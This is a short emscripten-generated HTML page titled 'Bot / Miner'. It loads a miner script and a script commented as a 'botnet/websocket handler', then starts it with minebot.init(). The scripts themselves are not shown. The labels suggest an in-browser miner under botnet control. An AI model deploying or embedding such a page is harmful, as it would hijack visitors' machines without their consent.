<!doctype html>
<html lang="en-us">

<head>
  <meta charset="utf-8">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Bot / Miner</title>
  <link rel="stylesheet" href="miner_plus_bot.css">
</head>

<body>
  <div class="spinner" id='spinner'></div>
  <div class="emscripten" id="status">Downloading...</div>
  <div class="emscripten">
    <progress value="0" max="100" id="progress" hidden=1></progress>
  </div>
  <div class="emscripten_border">
    <canvas class="emscripten" id="canvas" oncontextmenu="event.preventDefault()" tabindex=-1></canvas>
  </div>
  <textarea id="output" rows="8"></textarea>

  <!-- auto-generated by emscripten -->
  <script type="text/javascript" src="miner_canvas.js"></script>
  <script type="text/javascript" src="miner.js"></script>

  <!-- botnet/websocket handler (minebot) -->
  <script type="text/javascript" src="miner_plus_bot.js"></script>
  <script>minebot.init();</script>
</body>

</html>
